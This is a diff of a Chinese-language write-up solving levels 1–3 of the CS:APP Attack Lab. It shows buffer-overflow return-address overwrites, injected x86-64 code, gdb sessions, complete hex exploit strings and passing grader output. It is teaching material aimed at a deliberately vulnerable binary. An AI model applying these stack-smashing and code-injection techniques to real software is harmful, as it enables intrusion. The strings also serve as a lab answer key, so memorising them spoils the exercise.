@@ -12,6 +12,13 @@
 ```
 xxx.txt 就是输入的内容。要求输入为16进制数字对，用空格隔开。
 
+上述方法可能问题，可以用下列方式
+```
+./hex2raw < xxx.txt > xxx-raw.txt
+./ctarget -i xxx-raw.txt -q
+```
+
+
 # 基础知识
 1. call指令
    将PC值压入栈空，jmp到函数所在为止
@@ -68,9 +75,26 @@ objdump -S ctarget > ctarget.lst
 ```
 为了让test调用完getbuf()后，不会回到test函数，而是跳转到touch1()，需要修改栈中存储的PC值。
 那么可以通过传入字符串填满getbuf()栈空间，并且修改栈中的PC值，所以传入字符串大小大于40B，40B数据后为touch1地址。
-touch1.txt如下：
+touch1.txt如下，注意每一行最后需要有空格，否则转为16进制有点问题
 ```
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00 
+```
+---
+实验结果：
+```
+Cookie: 0x59b997fa
+Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
 ```
 # touch2
 
@@ -84,56 +108,211 @@ touch2地址=00000000004017ec
 touch2函数在writeup中有C语言代码，可以看出，touch2是将输入参数与cookie比较，如果相等才能成功
 
 现在解决level2问题有以下关键点：
-1. getbuf后跳转到touch2。在getbuf后注入一段代码，通过ret执行这个操作。和touch1操作不同是除了跳转还要执行特定代码。
+1. getbuf后跳转到touch2。在getbuf后注入一段代码，通过ret执行这个操作（注入代码）。和touch1操作不同是除了跳转还要执行特定代码。因此test栈的ret值 = 注入代码位置
 2. touch2输入参数为cookie值，也就是将cookie值存放到%rdi。
-3. 这段注入代码注入的位置在哪里？--getbuf函数栈顶位置
+3. 这段注入代码注入的位置在哪里？--getbuf函数栈中，不妨放在栈顶位置
 
 ## 注入代码
 ```asm
-mov 0x59b997fa, %rdi # cookie val
-push 0x4017ec  # touch2 addr
-ret # pop 0x4017ec = PC, jmp to here
+mov $0x59b997fa, %rdi # 输入参数 = cookie
+push $0x4017ec  # touch2函数地址入栈
+ret
 ```
 将上述汇编代码touch2.s转为16进制代码：
+```
 unix> gcc -c touch2.s
 unix> objdump -d touch2.o > touch2.d
+```
 
 touch2.d内容如下：
 
 ```asm
+
+touch2.o：     文件格式 elf64-x86-64
+
+
 Disassembly of section .text:
 
 0000000000000000 <.text>:
-   0:	48 8b 3c 25 fa 97 b9 	mov    0x59b997fa,%rdi
-   7:	59 
-   8:	ff 34 25 ec 17 40 00 	push   0x4017ec
-   f:	c3                   	ret 
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	68 ec 17 40 00       	push   $0x4017ec
+   c:	c3                   	ret    
 ```
 ## 注入位置
-```asm
-(gdb) b getbuf
-Breakpoint 1 at 0x4017a8: file buf.c, line 12.
-(gdb) r -q -i t1raw.txt 
-Starting program: /home/eve/work/CSAPP3e-lab-self-study/03-attack/ctarget -q -i t1raw.txt
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Cookie: 0x59b997fa
-
-Breakpoint 1, getbuf () at buf.c:12
-12      buf.c: 没有那个文件或目录.
-(gdb) p /x $rsp
-$1 = 0x5561dca0
+在getbuf函数内部打断点，然后运行查看当前的栈顶位置
 ```
+gdb-peda$ p/x $rsp
+$1 = 0x5561dc78
+```
+
+我这里一开始调试看到的rsp值不对，用gdb peda单步调试后查看到了正确的rsp值, 
+```
+b getbuf
+r -q -i cookie.txt 
+stepi
+p/x $rsp
+q
+```
+
 ## 最终输入touch2.txt
 
 ```
-48 8b 3c 25 fa 97 b9 59
-ff 34 25 ec 17 40 00 c3 # 注入代码，栈顶
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-a0 dc 61 55 00 00 00 00 # 栈底
+48 c7 c7 fa 97 b9 59 68 ==> 栈顶 注入代码
+ec 17 40 00 c3 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+78 dc 61 55 00 00 00 00 ==> 栈底 注入代码位置
 ```
-## 测试
 
+测试结果如下：
+```
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+```
 # touch3
+touch3()函数会调用hexmatch(cokkie. sval)函数，在hexmatch中会分配一个110B的cbuf数组，将cookie的值按格式化字符串"59b997fa"输出到这个数字的一个随机位置，然后比较sval和格式化字符串的前9个字节。
+
+关键问题：
+- cookie格式化字符串对应的ascii码是啥？
+  - 35 39 62 39 39 37 66 61
+  - [string2ascii tool](https://www.asciim.cn/m/tools/convert_string_to_ascii.html)
+- getbuf后跳转到touch3位置00000000004018fa
+- touch3输入参数是字符串所在位置，那么这个字符串放在哪里？怎么将字符串指针传入touch3？
+  - getbuf后会跳转到touch3函数，此时touch3栈自动销毁，touch3会建立新的函数栈，因此这个字符串应该放在test栈中，比如test函数栈顶
+  - 怎么将cookie对应的ascii码写到test栈顶呢？显然和前面的方式一样，getbuf分配的是40B,只需要在40B之后写ascii码就能覆盖test栈帧
+- 注入代码位置？
+  - 和touch2一样，放在getbuf的栈中
+
+整个栈内布局情况：
+|内容|栈位置|
+|----|----|
+|cookie ascii 码| |
+|----|----|
+|注入代码的位置|返回地址|
+|----|----|
+|。。。。|填充字符|
+|----|----|
+|ret| |
+|----|----|
+|pushq touch3地址| |
+|----|----|
+|rdi = cookie地址|----|
+|----|----|
+  
+getbuf退出时：
+1. 执行ret = pop and jmp, 因此从栈中弹出返回地址，跳转到注入代码处
+2. 执行注入代码
+   1. 将cookie地址传入rdi寄存器作为touch3的第一个输入参数
+   2. touch3地址入栈
+   3. 执行ret，将touch3地址pop，并跳转到touch3
+   
+## 获取test函数的栈顶位置
+在call getbuf前打断点，然后查看rsp值,此时是test 函数的栈顶位置
+```
+xxx:~/work/CSAPP3e-lab-self-study/03-attack$ gdb ctarget 
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+--Type <RET> for more, q to quit, c to continue without paging--c
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...
+gdb-peda$ b *0x40196c
+Breakpoint 1 at 0x40196c: file visible.c, line 92.
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x55586000 --> 0x0 
+RCX: 0x0 
+RDX: 0x5561dcc0 --> 0xf4f4f4f4f4f4f4f4 
+RSI: 0xf4 
+RDI: 0x55685fd0 --> 0x0 
+RBP: 0x55685fe8 --> 0x402fa5 --> 0x3a6968003a697168 ('hqi:')
+RSP: 0x5561dca8 --> 0x9 ('\t')
+RIP: 0x40196c (<test+4>:        mov    eax,0x0)
+R8 : 0x0 
+R9 : 0x0 
+R10: 0x7ffff7c0be98 --> 0xf001a00007c15 
+R11: 0x7ffff7da0f80 (<__memset_avx2_unaligned_erms>:    endbr64)
+R12: 0x4 
+R13: 0x0 
+R14: 0x0 
+R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x0
+EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40195e <touch3+100>:       mov    edi,0x0
+   0x401963 <touch3+105>:       call   0x400e40 <exit@plt>
+   0x401968 <test>:     sub    rsp,0x8
+=> 0x40196c <test+4>:   mov    eax,0x0
+   0x401971 <test+9>:   call   0x4017a8 <getbuf>
+   0x401976 <test+14>:  mov    edx,eax
+   0x401978 <test+16>:  mov    esi,0x403188
+   0x40197d <test+21>:  mov    edi,0x1
+[------------------------------------stack-------------------------------------]
+0000| 0x5561dca8 --> 0x9 ('\t')
+0008| 0x5561dcb0 --> 0x401f24 (<launch+112>:    cmp    DWORD PTR [rip+0x2025bd],0x0        # 0x6044e8 <is_checker>)
+0016| 0x5561dcb8 --> 0x0 
+0024| 0x5561dcc0 --> 0xf4f4f4f4f4f4f4f4 
+0032| 0x5561dcc8 --> 0xf4f4f4f4f4f4f4f4 
+0040| 0x5561dcd0 --> 0xf4f4f4f4f4f4f4f4 
+0048| 0x5561dcd8 --> 0xf4f4f4f4f4f4f4f4 
+0056| 0x5561dce0 --> 0xf4f4f4f4f4f4f4f4 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, test () at visible.c:92
+92      visible.c: 没有那个文件或目录.
+gdb-peda$ p/x $rsp
+$1 = 0x5561dca8
+```
+
+## 注入代码
+  
+```
+mov $0x5561dca8,%rdi # 存放ascii码的指针，即test ret上一个位置
+push $0x4018fa # 
+ret
+```
+
+```
+48 c7 c7 a8 dc 61 55 68 
+fa 18 40 00 c3 00 00 00 ==> 注入代码
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 ==> 注入代码位置
+35 39 62 39 39 37 66 61 ==> cookie ascii码
+```
+
+## 测试结果
+```
+eve@eve-Inspiron-7560:~/work/CSAPP3e-lab-self-study/03-attack$ ./ctarget -q -i t3raw.txt 
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
+```
+
+# touch4
+
+# touch5
